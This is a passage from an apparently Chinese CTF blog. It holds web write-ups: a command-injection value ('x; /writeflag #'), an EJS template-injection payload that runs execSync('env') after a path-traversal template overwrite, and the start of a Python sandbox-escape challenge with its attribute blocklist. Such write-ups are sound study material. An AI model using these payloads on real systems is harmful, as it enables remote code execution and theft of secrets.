class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>  <span class="hljs-string">&quot;remote_password&quot;</span>: <span class="hljs-string">&quot;x; /writeflag #&quot;</span><br>&#125;<br><span class="hljs-string">``</span><span class="hljs-string">`\</span><br><span class="hljs-string"></span><br><span class="hljs-string">## BandBomb  </span><br><span class="hljs-string"></span><br><span class="hljs-string">tags:nodejs ssti 模板注入  </span><br><span class="hljs-string">下载到源码，只有一个app.js，java这一块。  </span><br><span class="hljs-string">叫ai注释一下：  </span><br><span class="hljs-string">`</span><span class="hljs-string">``</span>javascript=<br><span class="hljs-comment">// 引入必要的模块</span><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);           <span class="hljs-comment">// Express 框架，用于构建 Web 服务器</span><br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);             <span class="hljs-comment">// 处理文件上传的中间件</span><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);                     <span class="hljs-comment">// Node.js 文件系统模块，用于操作文件和目录</span><br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);                 <span class="hljs-comment">// 路径处理模块，用于处理和转换文件路径</span><br><br><span class="hljs-comment">// 创建 Express 应用实例</span><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br><span class="hljs-comment">// 设置视图引擎为 EJS（嵌入式 JavaScript 模板）</span><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-comment">// 静态资源中间件：将 /static 路径映射到项目根目录下的 public 文件夹</span><br><span class="hljs-comment">// 例如：访问 http://localhost:3000/static/style.css 会返回 public/style.css 文件</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/static&#x27;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><span class="hljs-comment">// 使用 express.json() 中间件解析 JSON 请求体（用于接收前端发送的 JSON 数据）</span><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-comment">// 配置 Multer 的存储选项</span><br><span class="hljs-keyword">const</span> storage = multer.<span class="hljs-title function_">diskStorage</span>(&#123;<br>  <span class="hljs-comment">// destination：定义文件上传后存储的目录</span><br>  <span class="hljs-attr">destination</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> uploadDir = <span class="hljs-string">&#x27;uploads&#x27;</span>;  <span class="hljs-comment">// 上传文件将保存在项目根目录下的 uploads 文件夹中</span><br><br>    <span class="hljs-comment">// 如果 uploads 目录不存在，则创建它</span><br>    <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(uploadDir)) &#123;<br>      fs.<span class="hljs-title function_">mkdirSync</span>(uploadDir);  <span class="hljs-comment">// 同步创建目录</span><br>    &#125;<br><br>    <span class="hljs-comment">// 回调函数：第一个参数为错误（null 表示无错误），第二个为存储路径</span><br>    <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, uploadDir);<br>  &#125;,<br>  <span class="hljs-comment">// filename：定义上传文件保存时的文件名</span><br>  <span class="hljs-attr">filename</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 使用文件的原始文件名（不推荐用于生产环境，存在安全风险）</span><br>    <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, file.<span class="hljs-property">originalname</span>);<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// 创建 Multer 上传中间件实例</span><br><span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>(&#123; <br>  <span class="hljs-attr">storage</span>: storage,<br>  <span class="hljs-comment">// 自定义文件过滤逻辑</span><br>  <span class="hljs-attr">fileFilter</span>: <span class="hljs-function">(<span class="hljs-params">_, file, cb</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// 检查文件名是否有效</span><br>      <span class="hljs-keyword">if</span> (!file.<span class="hljs-property">originalname</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">cb</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;无效的文件名&#x27;</span>), <span class="hljs-literal">false</span>); <span class="hljs-comment">// false 表示拒绝该文件</span><br>      &#125;<br>      <span class="hljs-comment">// true 表示接受该文件</span><br>      <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-comment">// 捕获异常并返回错误</span><br>      <span class="hljs-title function_">cb</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;文件处理错误&#x27;</span>), <span class="hljs-literal">false</span>);<br>    &#125;<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// GET 请求：访问首页 /</span><br><span class="hljs-comment">// 渲染 EJS 模板页面，并列出所有已上传的文件</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> uploadsDir = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;uploads&#x27;</span>);  <span class="hljs-comment">// 构建 uploads 目录的绝对路径</span><br><br>  <span class="hljs-comment">// 确保 uploads 目录存在，如果不存在则创建</span><br>  <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(uploadsDir)) &#123;<br>    fs.<span class="hljs-title function_">mkdirSync</span>(uploadsDir);<br>  &#125;<br><br>  <span class="hljs-comment">// 读取 uploads 目录中的所有文件</span><br>  fs.<span class="hljs-title function_">readdir</span>(uploadsDir, <span class="hljs-function">(<span class="hljs-params">err, files</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-comment">// 如果读取失败（如权限问题），返回 500 错误，并渲染空文件列表</span><br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mortis&#x27;</span>, &#123; <span class="hljs-attr">files</span>: [] &#125;);<br>    &#125;<br>    <span class="hljs-comment">// 成功则渲染名为 &#x27;mortis&#x27; 的 EJS 模板，传入文件列表</span><br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mortis&#x27;</span>, &#123; <span class="hljs-attr">files</span>: files &#125;);<br>  &#125;);<br>&#125;);<br><br><span class="hljs-comment">// POST 请求：处理文件上传 /upload</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/upload&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 使用 Multer 处理单个文件上传，字段名为 &#x27;file&#x27;</span><br>  <span class="hljs-comment">// upload.single(&#x27;file&#x27;) 是一个中间件函数，需要手动调用并传入 req, res, 回调</span><br>  upload.<span class="hljs-title function_">single</span>(<span class="hljs-string">&#x27;file&#x27;</span>)(req, res, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-comment">// 如果上传过程中出错（如文件名无效），返回 400 错误和错误信息</span><br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">file</span>) &#123;<br>      <span class="hljs-comment">// 如果没有文件被上传</span><br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;没有选择文件&#x27;</span> &#125;);<br>    &#125;<br>    <span class="hljs-comment">// 上传成功，返回成功消息和文件名</span><br>    res.<span class="hljs-title function_">json</span>(&#123; <br>      <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;文件上传成功&#x27;</span>,<br>      <span class="hljs-attr">filename</span>: req.<span class="hljs-property">file</span>.<span class="hljs-property">filename</span> <br>    &#125;);<br>  &#125;);<br>&#125;);<br><br><span class="hljs-comment">// POST 请求：处理文件重命名 /rename</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/rename&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; oldName, newName &#125; = req.<span class="hljs-property">body</span>;  <span class="hljs-comment">// 从请求体中获取旧文件名和新文件名</span><br><br>  <span class="hljs-comment">// 构建旧文件和新文件的完整路径</span><br>  <span class="hljs-keyword">const</span> oldPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;uploads&#x27;</span>, oldName);<br>  <span class="hljs-keyword">const</span> newPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;uploads&#x27;</span>, newName);<br><br>  <span class="hljs-comment">// 验证参数是否完整</span><br>  <span class="hljs-keyword">if</span> (!oldName || !newName) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27; &#x27;</span> &#125;);  <span class="hljs-comment">// 注意：这里错误信息为空格，建议改进</span><br>  &#125;<br><br>  <span class="hljs-comment">// 使用 fs.rename 进行文件重命名（或移动）</span><br>  fs.<span class="hljs-title function_">rename</span>(oldPath, newPath, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-comment">// 重命名失败（如文件不存在、权限问题等）</span><br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27; &#x27;</span> + err.<span class="hljs-property">message</span> &#125;); <span class="hljs-comment">// 同样，错误信息前加了空格</span><br>    &#125;<br>    <span class="hljs-comment">// 重命名成功</span><br>    res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27; &#x27;</span> &#125;);  <span class="hljs-comment">// 成功消息也是一个空格，建议改进</span><br>  &#125;);<br>&#125;);<br><br><span class="hljs-comment">// 启动服务器</span><br><span class="hljs-comment">// 注意：这里使用了未定义的变量 &#x27;port&#x27;，会导致运行时错误！</span><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器运行在 http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>看了wp，关键在于他会渲染一个名叫mortis的文件:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">  fs.<span class="hljs-title function_">readdir</span>(uploadsDir, <span class="hljs-function">(<span class="hljs-params">err, files</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-comment">// 如果读取失败（如权限问题），返回 500 错误，并渲染空文件列表</span><br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mortis&#x27;</span>, &#123; <span class="hljs-attr">files</span>: [] &#125;);<br>    &#125;<br>    <span class="hljs-comment">// 成功则渲染名为 &#x27;mortis&#x27; 的 EJS 模板，传入文件列表</span><br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mortis&#x27;</span>, &#123; <span class="hljs-attr">files</span>: files &#125;);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>而ejs的默认模板目录为同目录下的views<br>与app.js在同一目录<br>并且由于：  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> storage = multer.<span class="hljs-title function_">diskStorage</span>(&#123;<br>  <span class="hljs-comment">// destination：定义文件上传后存储的目录</span><br>  <span class="hljs-attr">destination</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> uploadDir = <span class="hljs-string">&#x27;uploads&#x27;</span>;  <span class="hljs-comment">// 上传文件将保存在项目根目录下的 uploads 文件夹中</span><br><br>    <span class="hljs-comment">// 如果 uploads 目录不存在，则创建它</span><br>    <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(uploadDir)) &#123;<br>      fs.<span class="hljs-title function_">mkdirSync</span>(uploadDir);  <span class="hljs-comment">// 同步创建目录</span><br>    &#125;<br><br>    <span class="hljs-comment">// 回调函数：第一个参数为错误（null 表示无错误），第二个为存储路径</span><br>    <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, uploadDir);<br>  &#125;,<br>  <span class="hljs-comment">// filename：定义上传文件保存时的文件名</span><br>  <span class="hljs-attr">filename</span>: <span class="hljs-function">(<span class="hljs-params">req, file, cb</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 使用文件的原始文件名（不推荐用于生产环境，存在安全风险）</span><br>    <span class="hljs-title function_">cb</span>(<span class="hljs-literal">null</span>, file.<span class="hljs-property">originalname</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>由于在代码中使用了原始文件名，可能造成目录穿越<br>攻击思路就是上传一个构造好的模板文件，然后利用&#x2F;rename方法来进行目录穿越到veiws目录下，把mortis模板替换  </p><p>由于本人对nodejs的ssti了解等于0<br>所以叫ai尝试ssti，生成一个ejs:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;%= Object.getPrototypeOf(&#123;&#125;).constructor.constructor(&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;)&quot;)() %&gt;<br></code></pre></td></tr></table></figure><p><img src="http://notes.gwwafz.online/uploads/ad36fc7d-70d8-4940-9854-c3366b78dcbf.png"><br><img src="http://notes.gwwafz.online/uploads/be20a607-7d2f-490c-aaf1-2fa66c0a1853.png"><br><img src="http://notes.gwwafz.online/uploads/a6740166-24b8-4ee3-94c3-140f75e39bef.png"></p><p><a href="https://hgame.vidar.club/training/2?challenge=27">https://hgame.vidar.club/training/2?challenge=27</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mini-L 2025 部分 web 复现</title>
    <link href="/2025/11/01/Mini-L/"/>
    <url>/2025/11/01/Mini-L/</url>
    
    <content type="html"><![CDATA[<h1 id="Mini-L-2025-web-复现"><a href="#Mini-L-2025-web-复现" class="headerlink" title="Mini-L 2025 web 复现"></a>Mini-L 2025 web 复现</h1><p>年初打的比赛，做出几道题，但是还有做不出来的，当时没能复现，现在把剩下的题目复现。  </p><h2 id="pybox"><a href="#pybox" class="headerlink" title="pybox"></a>pybox</h2><p>tag: python沙箱逃逸，python继承，AST绕过，suid提权</p><p>应该是python沙箱，当前算是知识盲区，现在来当学习一下。  </p><p>打开界面得到一堆python的码：  </p><p><img src="http://notes.gwwafz.online/uploads/2e9d359a-48ed-4c50-ba93-c221730e53b2.png"></p><p>让ai注释且整理一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> ast<br><br><br><span class="hljs-comment"># 初始化 Flask 应用</span><br>app = Flask(__name__)<br><br><br><span class="hljs-comment"># ================== 沙箱 AST 访问器类 ==================</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxVisitor</span>(ast.NodeVisitor):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    自定义 AST 访问器，用于静态分析代码结构。</span><br><span class="hljs-string">    禁止访问某些危险属性或使用生成器表达式。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 黑名单：禁止访问这些特殊属性（可能被用于反射/逃逸）</span><br>    forbidden_attrs = &#123;<br>        <span class="hljs-string">&quot;__class__&quot;</span>,      <span class="hljs-comment"># 防止获取类对象</span><br>        <span class="hljs-string">&quot;__dict__&quot;</span>,       <span class="hljs-comment"># 防止修改命名空间</span><br>        <span class="hljs-string">&quot;__bases__&quot;</span>,      <span class="hljs-comment"># 类继承信息</span><br>        <span class="hljs-string">&quot;__mro__&quot;</span>,        <span class="hljs-comment"># 方法解析顺序</span><br>        <span class="hljs-string">&quot;__subclasses__&quot;</span>, <span class="hljs-comment"># 可用于获取所有类，绕过限制</span><br>        <span class="hljs-string">&quot;__globals__&quot;</span>,    <span class="hljs-comment"># 函数全局变量</span><br>        <span class="hljs-string">&quot;__code__&quot;</span>,       <span class="hljs-comment"># 函数字节码</span><br>        <span class="hljs-string">&quot;__closure__&quot;</span>,    <span class="hljs-comment"># 闭包变量</span><br>        <span class="hljs-string">&quot;__func__&quot;</span>, <span class="hljs-string">&quot;__self__&quot;</span>,     <span class="hljs-comment"># 绑定方法相关</span><br>        <span class="hljs-string">&quot;__module__&quot;</span>,     <span class="hljs-comment"># 模块信息</span><br>        <span class="hljs-string">&quot;__import__&quot;</span>,     <span class="hljs-comment"># 动态导入</span><br>        <span class="hljs-string">&quot;__builtins__&quot;</span>,   <span class="hljs-comment"># 内建命名空间</span><br>        <span class="hljs-string">&quot;__base__&quot;</span>        <span class="hljs-comment"># 基类</span><br>    &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_Attribute</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        当遇到属性访问时（如 obj.attr），检查是否为禁止属性。</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node.attr, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> node.attr <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.forbidden_attrs:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Forbidden attribute access&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.generic_visit(node)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_GeneratorExp</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        禁止使用生成器表达式（例如 (x for x in range(10))）</span><br><span class="hljs-string">        因为它可能导致延迟求值或内存消耗过大等问题。</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Generator expressions are not allowed&quot;</span>)<br><br><br><span class="hljs-comment"># ================== 沙箱执行函数 ==================</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_executor</span>(<span class="hljs-params">code, result_queue</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在独立进程中执行用户代码的安全函数。</span><br><span class="hljs-string">    使用受限的 globals 和捕获 stdout/stderr 输出。</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        code: 要执行的 Python 代码字符串</span><br><span class="hljs-string">        result_queue: 多进程通信队列，返回结果</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 构造安全的 builtins 子集</span><br>    safe_builtins = &#123;<br>        <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span>,<br>        <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-built_in">filter</span>,<br>        <span class="hljs-string">&quot;list&quot;</span>: <span class="hljs-built_in">list</span>,<br>        <span class="hljs-string">&quot;len&quot;</span>: <span class="hljs-built_in">len</span>,<br>        <span class="hljs-string">&quot;addaudithook&quot;</span>: sys.addaudithook,  <span class="hljs-comment"># 允许设置审计钩子</span><br>        <span class="hljs-string">&quot;Exception&quot;</span>: Exception,<br>    &#125;<br><br>    <span class="hljs-comment"># 设置干净的 global 命名空间</span><br>    safe_globals = &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: safe_builtins&#125;<br><br>    <span class="hljs-comment"># 重定向标准输出和错误流，以捕获 print 输出</span><br>    sys.stdout = io.StringIO()<br>    sys.stderr = io.StringIO()<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">exec</span>(code, safe_globals)  <span class="hljs-comment"># 执行代码</span><br>        output = sys.stdout.getvalue()   <span class="hljs-comment"># 获取正常输出</span><br>        error = sys.stderr.getvalue()    <span class="hljs-comment"># 获取错误输出</span><br>        result_queue.put((<span class="hljs-string">&quot;ok&quot;</span>, output <span class="hljs-keyword">or</span> error))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        result_queue.put((<span class="hljs-string">&quot;err&quot;</span>, <span class="hljs-built_in">str</span>(e)))<br><br><br><span class="hljs-comment"># ================== 安全执行主接口 ==================</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_exec</span>(<span class="hljs-params">code: <span class="hljs-built_in">str</span>, timeout=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    安全地执行一段代码，包含超时控制和 AST 检查。</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    步骤：</span><br><span class="hljs-string">    1. 解码 Unicode 转义字符</span><br><span class="hljs-string">    2. 解析语法树并进行 AST 安全检查</span><br><span class="hljs-string">    3. 启动子进程执行代码（避免阻塞主服务）</span><br><span class="hljs-string">    4. 设置超时终止机制</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    返回：执行结果或错误信息</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 处理 Unicode 转义（例如 \u0061 -&gt; &#x27;a&#x27;）</span><br>    code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br><br>    <span class="hljs-comment"># 解析成抽象语法树（AST）</span><br>    tree = ast.parse(code)<br><br>    <span class="hljs-comment"># 使用自定义访问器检查 AST 是否包含非法操作</span><br>    <span class="hljs-keyword">try</span>:<br>        SandboxVisitor().visit(tree)<br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: Suspicious code detected during AST analysis.&quot;</span><br><br>    <span class="hljs-comment"># 创建多进程队列用于接收执行结果</span><br>    result_queue = multiprocessing.Queue()<br><br>    <span class="hljs-comment"># 启动子进程执行代码（隔离运行环境）</span><br>    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))<br>    p.start()<br>    p.join(timeout=timeout)  <span class="hljs-comment"># 最多等待 timeout 秒</span><br><br>    <span class="hljs-comment"># 超时处理</span><br>    <span class="hljs-keyword">if</span> p.is_alive():<br>        p.terminate()  <span class="hljs-comment"># 强制终止进程</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Timeout: code took too long to run.&quot;</span><br><br>    